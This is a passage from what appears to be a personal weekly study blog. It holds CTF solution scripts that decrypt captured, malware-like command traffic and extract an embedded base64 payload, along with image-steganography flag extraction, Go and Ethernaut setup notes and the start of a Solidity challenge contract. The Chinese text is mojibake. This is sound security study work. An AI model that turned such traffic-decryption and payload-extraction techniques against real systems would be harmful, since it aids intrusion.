class="string">f&quot;type     = <span class="subst">&#123;ret[<span class="number">40</span>:<span class="number">41</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>) <span class="comment">#ipv4</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;host     = <span class="subst">&#123;<span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ret[<span class="number">41</span>:<span class="number">45</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;rand     = <span class="subst">&#123;ret[<span class="number">45</span>:<span class="number">45</span> + p].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;F        = 0x<span class="subst">&#123;ret[<span class="number">45</span> + p:<span class="number">45</span> + p + <span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;check    = <span class="subst">&#123;<span class="built_in">hex</span>(fnv1a_32(ret[:<span class="number">45</span> + p]))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3333</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHAKE128</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SizeParser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nonce</span>):</span><br><span class="line">        self.shake = SHAKE128.new(nonce)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(self.shake.read(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_padding</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() % <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">arr, key, iv</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    parser = SizeParser(iv)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(arr) &gt; <span class="number">0</span>:</span><br><span class="line">        padding = parser.next_padding()</span><br><span class="line">        L = parser.dec(bytes_to_long(arr[:<span class="number">2</span>])) - padding</span><br><span class="line"></span><br><span class="line">        arr = arr[<span class="number">2</span>:]</span><br><span class="line">        e_iv = p64(count, endian=<span class="string">&#x27;big&#x27;</span>)[<span class="number">6</span>:] + iv[<span class="number">2</span>:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            dec = AES.new(key, AES.MODE_GCM, e_iv).decrypt_and_verify(arr[:L-<span class="number">16</span>], arr[L-<span class="number">16</span>:L])</span><br><span class="line">            output.append(dec)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[!] Decryption failed!&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            arr = arr[L + padding:]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = cmd[<span class="number">45</span> + p + <span class="number">4</span>:]</span><br><span class="line">data_iv = ret[<span class="number">1</span>:<span class="number">17</span>]</span><br><span class="line">data_key = ret[<span class="number">17</span>:<span class="number">33</span>]</span><br><span class="line"><span class="comment"># print(type(data_key))</span></span><br><span class="line">pprint(decrypt(data, data_key, data_iv)[<span class="number">0</span>].decode().split(<span class="string">&#x27;\r\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4444</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line">res = <span class="built_in">open</span>(<span class="string">&#x27;res.bytes&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">res_key = md5(data_key)</span><br><span class="line">res_iv = md5(data_iv)</span><br><span class="line"><span class="comment"># print(res_key)</span></span><br><span class="line"><span class="comment"># print(res_iv)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_key  = <span class="subst">&#123;res_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_iv   = <span class="subst">&#123;res_iv&#125;</span>&quot;</span>)</span><br><span class="line">res_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(res_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(res_iv), segment_size=<span class="number">128</span>)</span><br><span class="line">dec_res = res_aes().decrypt(res[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;dec_res[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;dec_res[<span class="number">1</span>:<span class="number">2</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">2</span>:<span class="number">3</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c_l      = <span class="subst">&#123;dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">cmd_len = <span class="built_in">int</span>(dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">4</span>:<span class="number">4</span>+cmd_len].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">data = res[<span class="number">4</span> + cmd_len:]</span><br><span class="line">plaintext = decrypt(data, <span class="built_in">bytes</span>.fromhex(res_key), <span class="built_in">bytes</span>.fromhex(res_iv))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">5555</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># from base64 import b64decode</span></span><br><span class="line"><span class="comment"># data = &#x27;&#x27;.join(i.decode() for i in plaintext)</span></span><br><span class="line"><span class="comment"># start = data.find(&quot;atob(&#x27;&quot;) + len(&quot;atob(&#x27;&quot;)</span></span><br><span class="line"><span class="comment"># end = data.find(&quot;&#x27;);&quot;, start)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># binary = b64decode(data[start:end])</span></span><br><span class="line"><span class="comment"># check_sum = hashlib.sha256(binary).hexdigest()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># open(&#x27;doc.zip&#x27;, &#x27;wb&#x27;).write(binary)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span>.join(i.decode() <span class="keyword">for</span> i <span class="keyword">in</span> plaintext)</span><br><span class="line"></span><br><span class="line">start = data.find(<span class="string">&quot;atob(&#x27;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;atob(&#x27;&quot;</span>)</span><br><span class="line">end = data.find(<span class="string">&quot;&#x27;);&quot;</span>, start)</span><br><span class="line"></span><br><span class="line">binary = b64decode(data[start:end])</span><br><span class="line">check_sum = hashlib.sha256(binary).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&quot;doc.zip&quot;, &quot;wb&quot;).write(binary)</span></span><br><span class="line"><span class="built_in">print</span>(check_sum)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">6666</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">b&quot;api.ipify.org&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">7777</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">arr = np.array(img)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">bytes</span>(arr[:, :, <span class="number">3</span>].reshape(<span class="number">2000</span> * <span class="number">973</span>)).replace(<span class="string">b&#x27;\xff&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).decode()[:<span class="number">42</span>]</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment"># flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from PIL import Image</span></span><br><span class="line"><span class="comment"># pic = Image.open(&#x27;flag.png&#x27;)</span></span><br><span class="line"><span class="comment"># w, h = pic.size</span></span><br><span class="line"><span class="comment"># flag = []</span></span><br><span class="line"><span class="comment"># for i in range(h):</span></span><br><span class="line"><span class="comment">#     for j in range(w):</span></span><br><span class="line"><span class="comment">#         piexl = list(pic.getpixel((j, i)))[3]</span></span><br><span class="line"><span class="comment">#         if(piexl != 0xff):</span></span><br><span class="line"><span class="comment">#             flag.append(chr(int(piexl)))</span></span><br><span class="line"><span class="comment">#             if len(flag) == 42:</span></span><br><span class="line"><span class="comment">#                 print(&#x27;&#x27;.join(flag))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># output</span><br><span class="line">time     = 1615528982</span><br><span class="line">cmd_key  = b50d916ac0cec067981af8e5f38a758f</span><br><span class="line">cmd_iv   = 881eb47d4d3b67b24328c5178c0eedcc</span><br><span class="line">------------------------------------------------</span><br><span class="line">ver      = 01</span><br><span class="line">dat_iv   = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">dat_key  = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 1101</span><br><span class="line">p        = 6</span><br><span class="line">sec      = 3</span><br><span class="line"></span><br><span class="line">cmd      = 01</span><br><span class="line">port     = 5000</span><br><span class="line">type     = 01</span><br><span class="line"></span><br><span class="line">host     = 127.0.0.1</span><br><span class="line">rand     = 1ace7d9bb0b5</span><br><span class="line">F        = 0x39182c03</span><br><span class="line">check    = 0x39182c03</span><br><span class="line">------------------------------------------------</span><br><span class="line">dat_iv   = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">dat_key  = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">[&#x27;GET /out HTTP/1.1&#x27;,</span><br><span class="line"> &#x27;Host: 127.0.0.1:5000&#x27;,</span><br><span class="line"> &#x27;User-Agent: curl/7.75.0&#x27;,</span><br><span class="line"> &#x27;Accept: */*&#x27;,</span><br><span class="line"> &#x27;Connection: close&#x27;,</span><br><span class="line"> &#x27;&#x27;,</span><br><span class="line"> &#x27;&#x27;]</span><br><span class="line">------------------------------------------------</span><br><span class="line">res_key  = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">res_iv   = fa2a8ab0fadb4854943df690335a99b5</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 00</span><br><span class="line">cmd      = 00</span><br><span class="line">c_l      = 00</span><br><span class="line">cmd      = </span><br><span class="line">dat_iv   = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">dat_key  = fa2a8ab0fadb4854943df690335a99b5</span><br><span class="line">------------------------------------------------</span><br><span class="line">3a5648f7de99c4f87331c36983fc8adcd667743569a19c8dafdd5e8a33de154d</span><br><span class="line">------------------------------------------------</span><br><span class="line">08229f4052dde89671134f1784bed2d6</span><br><span class="line">------------------------------------------------</span><br><span class="line">flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//seed init</span></span><br><span class="line">	loc, _ := time.LoadLocation(<span class="string">&quot;Local&quot;</span>)</span><br><span class="line">	timeObj, _ := time.ParseInLocation(</span><br><span class="line">		<span class="string">&quot;2006-01-02 15:04:05&quot;</span>,</span><br><span class="line">		<span class="string">&quot;2022-07-19 14:49:56&quot;</span>, loc)</span><br><span class="line">	seed := timeObj.Unix()</span><br><span class="line">	rand.Seed(seed)</span><br><span class="line"></span><br><span class="line">	input, _ := os.Open(<span class="string">&quot;./src.png&quot;</span>)</span><br><span class="line">	in := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">70475</span>)</span><br><span class="line">	lenx, _ := input.Read(in)</span><br><span class="line">	table := <span class="built_in">make</span>([]<span class="type">int</span>, lenx)</span><br><span class="line">	out := <span class="built_in">make</span>([]<span class="type">byte</span>, lenx)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		table[i] = i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shuffle</span></span><br><span class="line">	rand.Shuffle(<span class="built_in">len</span>(table), <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		table[i], table[j] = table[j], table[i]</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		out[table[i]] = in[i]</span><br><span class="line">	&#125;</span><br><span class="line">	output, _ := os.Create(<span class="string">&quot;./flag.png&quot;</span>)</span><br><span class="line">	output.Write(out)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="vscodeå®‰è£…é…ç½®golangç¯å¢ƒ"><a href="#vscodeå®‰è£…é…ç½®golangç¯å¢ƒ" class="headerlink" title="vscodeå®‰è£…é…ç½®golangç¯å¢ƒ"></a>vscodeå®‰è£…é…ç½®golangç¯å¢ƒ</h2><h3 id="å®‰è£…go"><a href="#å®‰è£…go" class="headerlink" title="å®‰è£…go"></a>å®‰è£…go</h3><ul>
<li>å®˜ç½‘ä¸‹è½½ï¼Œä½†åº”è¯¥éœ€è¦ç§‘å­¦ï¼Œæ‰¾äº†ä¸ªä¸­æ–‡ç½‘è¿›è¡Œä¸‹è½½äº†ã€‚<a href="https://studygolang.com/dl">Goä¸‹è½½ - Goè¯­è¨€ä¸­æ–‡ç½‘ - Golangä¸­æ–‡ç¤¾åŒº (studygolang.com)</a></li>
<li>ç›´æ¥ä¸€è·¯<code>Next</code>ä¸‹è½½ï¼Œæœ€ç»ˆå®‰è£…åœ¨Cç›˜äº†ã€‚</li>
<li>å‘½ä»¤è¡Œè¾“å…¥<code>go version</code>ï¼Œè¾“å‡ºå¦‚ä¸‹å³è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230421141717886.png" class="" title="image-20230421141717886">

<h3 id="vsé…ç½®goç¯å¢ƒ"><a href="#vsé…ç½®goç¯å¢ƒ" class="headerlink" title="vsé…ç½®goç¯å¢ƒ"></a>vsé…ç½®goç¯å¢ƒ</h3><p>ä¸ºä¿è¯ç¯å¢ƒèƒ½å¤Ÿæ­£å¸¸å®‰è£…ä¸‹è½½goæ’ä»¶ï¼Œéœ€è¦æ‰§è¡Œä¸¤æ¡å‘½ä»¤ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> env -w GO111MODULE=on</span><br><span class="line"><span class="keyword">go</span> env -w GOPROXY=https:<span class="comment">//goproxy.cn,direct</span></span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230421142201384.png" class="" title="image-20230421142201384">

<p>éªŒè¯ä¸€ä¸‹ï¼Œä½¿ç”¨å‘½ä»¤<code>go env</code>ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421142818010.png" class="" title="image-20230421142818010">

<p>æ— è¯­ï¼Œæœ€ç»ˆæµ‹è¯•æˆåŠŸäº†ï¼Œå†™çš„æµ‹è¯•ä»£ç ä¸€ç›´å¤±è´¥ï¼Œä¸çŸ¥é“é—®é¢˜å‡ºç°åœ¨å“ªé‡Œäº†ã€‚</p>
<p>åæ¥å‘ç°ï¼Œè¡Œå§ï¼Œå•å¼•å·è·ŸåŒå¼•å·åœ¨<code>go</code>ç¯å¢ƒä¸­ä¸¥æ ¼åŒºåˆ†ã€‚</p>
<p>è€Œä¸”è¿è¡Œä»£ç ä¹‹å‰ä¸€å®šè¦ä¿å­˜æ–‡ä»¶ï¼Œè¦ä¸ç„¶èƒ¡ç›´æ¥æŠ¥é”™ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello go world!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230421143648479.png" class="" title="image-20230421143648479">

<h1 id="230424"><a href="#230424" class="headerlink" title="230424"></a>230424</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">	w --- x --- y --- z</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line"></span><br><span class="line">        title è½¯ä»¶å¼€å‘ç”˜ç‰¹å›¾</span><br><span class="line"></span><br><span class="line">        section è®¾è®¡</span><br><span class="line">        éœ€æ±‚:done,des1, 2019-01-06,2019-01-08</span><br><span class="line">        åŸå‹:active,des2, 2019-01-09, 3d</span><br><span class="line">        UIè®¾è®¡:des3, after des2, 5d</span><br><span class="line">        æœªæ¥ä»»åŠ¡:des4, after des3, 5d</span><br><span class="line"></span><br><span class="line">        section å¼€å‘</span><br><span class="line">        å­¦ä¹ å‡†å¤‡ç†è§£éœ€æ±‚:crit, done, 2019-01-06,24h</span><br><span class="line">        è®¾è®¡æ¡†æ¶:crit, done, after des2, 2d</span><br><span class="line">        å¼€å‘:crit, active, 3d</span><br><span class="line">        æœªæ¥ä»»åŠ¡:crit, 5d</span><br><span class="line">        ä¼‘æ¯æ—¶é—´:2d</span><br><span class="line"></span><br><span class="line">        section æµ‹è¯•</span><br><span class="line">        åŠŸèƒ½æµ‹è¯•:active, a1, after des3, 3d</span><br><span class="line">        å‹åŠ›æµ‹è¯•:after a1, 20h</span><br><span class="line">        æµ‹è¯•æŠ¥å‘Š: 48h</span><br></pre></td></tr></table></figure>

<h2 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a>Ethernaut</h2><blockquote>
<p><a href="https://ctf-wiki.org/blockchain/ethereum/selector-encoding/">Function Selector and Argument Encoding - CTF Wiki (ctf-wiki.org)</a></p>
</blockquote>
<h3 id="å®‰è£…MetaMask"><a href="#å®‰è£…MetaMask" class="headerlink" title="å®‰è£…MetaMask"></a>å®‰è£…MetaMask</h3><ul>
<li>è°·æ­Œä¸‹è½½æ’ä»¶ï¼Œå®¹æ˜“å› ä¸ºåå°æ›´æ–°å¯¼è‡´ç›´æ¥æŠŠå®‰è£…çš„æ’ä»¶ç»™æ¸…é™¤ï¼Œå› ä¸ºé»˜è®¤å®‰è£…çš„æ’ä»¶éƒ½æ˜¯ä¸å®‰å…¨çš„ã€‚</li>
<li>äºæ˜¯è·‘å»ç«ç‹ä¸‹è½½æ’ä»¶äº†ï¼Œç«ç‹æµè§ˆå™¨ç‰ˆæœ¬é—®é¢˜å¯¼è‡´æ— æ³•éªŒè¯æ’ä»¶å‹ç¼©åŒ…çš„ç­¾åï¼Œæ— æ³•å®‰è£…ã€‚ä½†ç«ç‹èƒ½å¤Ÿæµè§ˆå™¨å†…ä¸‹è½½æ’ä»¶ï¼Œç°åœ¨å‹‰å¼ºè¿˜æ˜¯èƒ½ç”¨ã€‚</li>
</ul>
<h3 id="æ‰“å¼€æµè§ˆå™¨console"><a href="#æ‰“å¼€æµè§ˆå™¨console" class="headerlink" title="æ‰“å¼€æµè§ˆå™¨console"></a>æ‰“å¼€æµè§ˆå™¨console</h3><img src="/2023/12/31/WeeklyStudy/image-20230424144239884.png" class="" title="image-20230424144239884">

<p>æ‰“å¼€æ§åˆ¶å°çœ‹åˆ°çš„ç•Œé¢ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230424143809546.png" class="" title="image-20230424143809546">

<p>è¿™ä¸ªåº”è¯¥è¯¥<code>level</code>çš„<code>token</code>ã€‚</p>
<p>ç„¶åå¯ä»¥é€šè¿‡<code>player</code>æŸ¥çœ‹è‡ªå·±çš„<code>token</code>ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230424143933799.png" class="" title="image-20230424143933799">

<p><em>è¯è¯´è¿™ä¸ªè¦å¯¼å…¥å—â€¦â€¦emmï¼Œæš‚ä¸”å…ˆä¸å¯¼å…¥å•¥çš„ï¼Œç»§ç»­å¾€ä¸‹çœ‹çœ‹å§ã€‚</em></p>
<h3 id="ä½¿ç”¨console-help"><a href="#ä½¿ç”¨console-help" class="headerlink" title="ä½¿ç”¨console help()"></a>ä½¿ç”¨console help()</h3><img src="/2023/12/31/WeeklyStudy/image-20230424144331871.png" class="" title="image-20230424144331871">

<p>è°ƒç”¨<code>help()</code>ç›´æ¥æŸ¥çœ‹å¤§æ¦‚çš„å‡½æ•°ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230424144706384.png" class="" title="image-20230424144706384">

<img src="/2023/12/31/WeeklyStudy/image-20230424144721819.png" class="" title="image-20230424144721819">

<h3 id="æ™ºèƒ½åˆçº¦ï¼Ÿ"><a href="#æ™ºèƒ½åˆçº¦ï¼Ÿ" class="headerlink" title="æ™ºèƒ½åˆçº¦ï¼Ÿ"></a>æ™ºèƒ½åˆçº¦ï¼Ÿ</h3><blockquote>
<p><a href="https://docs.soliditylang.org/en/latest/">Solidity â€” Solidity 0.8.20 documentation (soliditylang.org)</a></p>
<p><a href="http://remix.ethereum.org/#optimize=false&amp;runs=200&amp;evmVersion=null">http://remix.ethereum.org/#optimize=false&amp;runs=200&amp;evmVersion=null</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230424145447477.png" class="" title="image-20230424145447477">

<p>ç«ç‹è°ƒç”¨çš„è¯ï¼Œå¥½åƒæ˜¯<code>ethereum</code>ã€‚</p>
<p><em>emmï¼Œå…ˆå¾€ä¸‹ç»§ç»­çœ‹çœ‹ã€‚</em></p>
<p><em>ä¸å¤ªå¯¹ï¼Œç«ç‹åº”è¯¥è°ƒç”¨çš„å‡½æ•°ä¸å˜ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆç«ç‹æ— æ³•è°ƒç”¨ã€‚</em></p>
<p><em><strong>emmï¼Œä¼¼ä¹å› ä¸ºæ²¡æœ‰æµ‹è¯•å¸å¯¼è‡´æ— æ³•new instanceï¼Œä¸æ˜¯å§ä¸æ˜¯å§ï¼ŒçœŸæ˜¯è¿™ç§ç¥å¥‡åŸå› å˜›ï¼Ÿï¼Ÿï¼Ÿ</strong></em></p>
<img src="/2023/12/31/WeeklyStudy/image-20230424171144656.png" class="" title="image-20230424171144656">

<p><em>çœŸå¥½ï¼Œå»æ°´é¾™å¤´é‚£æ•´æµ‹è¯•å¸ï¼Œè‚‰çœ¼å¯è§ç”µè„‘å¿«çª’æ¯æŒ‚æœºäº†ã€‚</em></p>
<h1 id="230425"><a href="#230425" class="headerlink" title="230425"></a>230425</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">å¦‚æœ16è¿›åˆ¶æ˜¯å°å†™çš„å½¢å¼ï¼Œæ³¨æ„ç¬¬2ä¸ªå‚æ•°è¦å˜æˆTrue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">hexstr = <span class="string">&#x27;2f2f3130322f2f3130382f2f39372f2f3130332f2f3132332f2f35372f2f35322f2f35322f2f3130322f2f39392f2f3130322f2f39392f2f35332f2f35302f2f39372f2f3130322f2f39372f2f3130302f2f35362f2f35362f2f34382f2f35322f2f35302f2f35352f2f35342f2f39392f2f3130312f2f34392f2f35372f2f39392f2f35312f2f35352f2f35302f2f3130302f2f35342f2f35302f2f35372f2f313235&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">charstr = base64.b16decode(hexstr, <span class="literal">True</span>).decode()</span><br><span class="line">flag_list = charstr.split(<span class="string">&#x27;//&#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="comment"># print(flag_list)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_list:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="ç°ä»£å¯†ç å­¦åŠæ•°å­—åŠ å¯†æŠ€æœ¯"><a href="#ç°ä»£å¯†ç å­¦åŠæ•°å­—åŠ å¯†æŠ€æœ¯" class="headerlink" title="ç°ä»£å¯†ç å­¦åŠæ•°å­—åŠ å¯†æŠ€æœ¯"></a>ç°ä»£å¯†ç å­¦åŠæ•°å­—åŠ å¯†æŠ€æœ¯</h2><ul>
<li>ç°ä»£å¯†ç å­¦ä»‹ç»</li>
<li>å¯¹ç§°&#x2F;éå¯¹ç§°åŠ å¯†ç®—æ³•</li>
<li>æ¶ˆæ¯æ‘˜è¦&#x2F;æ•°å­—ç­¾åç®—æ³•</li>
</ul>
<p>$$<br>signature_A \equiv H(M)^{d1} \mod n1<br>$$</p>
<p>$$<br>verify \equiv (signature_A)^{e1} \mod n1<br>$$</p>
<h2 id="Ethå‡†å¤‡ï¼Ÿ"><a href="#Ethå‡†å¤‡ï¼Ÿ" class="headerlink" title="Ethå‡†å¤‡ï¼Ÿ"></a>Ethå‡†å¤‡ï¼Ÿ</h2><p>æµ‹è¯•å¸å•Šæµ‹è¯•å¸ã€‚</p>
<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    